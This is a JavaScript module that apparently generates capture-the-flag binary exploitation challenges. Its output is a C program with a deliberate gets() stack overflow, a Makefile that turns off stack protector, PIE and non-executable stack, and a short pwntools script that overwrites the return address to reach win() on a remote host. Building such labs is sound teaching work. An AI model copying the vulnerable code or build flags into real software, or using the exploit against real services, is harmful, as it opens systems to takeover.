/**
 * Binary Exploitation (Pwn) — category-specific builder.
 * Mock implementation that uses the REAL spec data (flag, name, exploit path).
 * Phase 3: will call Claude API with prompt.md like web/forensics builders.
 */
export default {
  categoryId: 'pwn',

  async build(spec) {
    const name = spec.challengeName || spec.challenge_name || 'Pwn Challenge';
    const flag = spec.flag || (Array.isArray(spec.flags) && spec.flags[0]) || null;
    if (!flag) throw new Error('Pwn builder: spec has no flag');

    const narrative = spec.narrative || 'Exploit the binary vulnerability.';
    const difficulty = spec.difficulty || 'medium';
    const points = spec.points || 300;
    const exploitPath = spec.exploitPath || ['Analyze the binary', 'Find the vulnerability', 'Craft exploit'];
    const techStack = spec.techStack || ['C', 'GCC', 'pwntools'];
    const antiAi = spec.antiAiCountermeasures || [];

    return {
      files: [
        {
          path: 'vuln.c',
          language: 'c',
          content: `/*
 * ${name} - Vulnerable Binary
 * Tech stack: ${techStack.join(', ')}
 * Difficulty: ${difficulty}
 *
 * Exploit path:
${exploitPath.map((s, i) => ` *   ${i + 1}. ${s}`).join('\n')}
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// TODO: Phase 3 will generate a real vulnerable binary matching the spec
void win() {
    char flag[128];
    FILE *f = fopen("flag.txt", "r");
    if (f) {
        fgets(flag, sizeof(flag), f);
        printf("Congratulations! %s\\n", flag);
        fclose(f);
    }
}

void vuln() {
    char buf[64];
    printf("Enter input: ");
    gets(buf);
    printf("You said: %s\\n", buf);
}

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    printf("=== ${name} ===\\n");
    vuln();
    return 0;
}
`,
        },
        {
          path: 'Makefile',
          language: 'makefile',
          content: `CC=gcc
CFLAGS=-fno-stack-protector -no-pie -z execstack
TARGET=vuln

all: $(TARGET)

$(TARGET): vuln.c
\t$(CC) $(CFLAGS) -o $(TARGET) vuln.c

clean:
\trm -f $(TARGET)
`,
        },
        {
          path: 'flag.txt',
          language: 'text',
          content: flag,
        },
        {
          path: 'exploit.py',
          language: 'python',
          content: `#!/usr/bin/env python3
"""Exploit for ${name}"""
# Exploit path:
${exploitPath.map((s, i) => `# Step ${i + 1}: ${s}`).join('\n')}

from pwn import *
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9999

elf = ELF("./vuln")
win_addr = elf.symbols["win"]
print(f"[*] win() at {hex(win_addr)}")

r = remote(TARGET, PORT)
payload = b"A" * 72 + p64(win_addr)
r.sendlineafter(b"input: ", payload)
r.interactive()
`,
        },
        {
          path: 'writeup.md',
          language: 'markdown',
          content: `# ${name} - Writeup

## Challenge Description
${narrative}

## Difficulty
${difficulty} (${points} points)

## Tech Stack
${techStack.map((t) => `- ${t}`).join('\n')}

## Solution
${exploitPath.map((s, i) => `${i + 1}. ${s}`).join('\n')}
${antiAi.length > 0 ? `\n## Anti-AI Measures\n${antiAi.map((m) => `- ${m}`).join('\n')}\n` : ''}
## Flag
\`${flag}\`
`,
        },
      ],
      tokenUsage: 0,
      durationMs: 0,
    };
  },
};
